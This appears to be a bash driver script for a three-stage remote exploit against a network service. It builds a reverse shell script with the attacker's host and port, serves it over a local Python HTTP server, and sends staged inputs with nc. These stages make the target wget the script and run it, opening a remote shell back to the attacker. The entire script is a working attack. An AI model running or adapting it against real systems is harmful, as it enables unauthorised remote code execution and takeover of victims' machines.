#!/bin/bash

if [ "$#" -ne 4 ]; then
    echo "$0 <RHOST> <RPORT> <LHOST> <LPORT>"
    exit
fi

RHOST=$1
RPORT=$2
LHOST=$3
LPORT=$4

echo "[*] Generating payload for the three stages"
python3 generate_input_files.py $LHOST

echo "[*] Modifying script reverse shell to $LHOST:$LPORT"
sed -e "s/LHOST/$LHOST/g" -e "s/LPORT/$LPORT/g" rev.sh > e
python3 generate_input_files.py $LHOST

echo "[*] Starting web browser"
python3 -m http.server&
sleep 1

echo "[*] Sending stage 1 to  $RHOST $PORT - wget http://$LHOST:8000/e"
nc -v $RHOST $RPORT < input_file_1
echo "[+] Done"
sleep 1

echo "[*] Sending stage 2 to  $RHOST $PORT"
nc -v $RHOST $RPORT < input_file_2
echo "[+] Done"
sleep 1

echo "[*] Sending stage 3 to  $RHOST $PORT.. The uploaded script should be executed"
nc -v $RHOST $RPORT < input_file_3
echo "[+] Done"
sleep 1
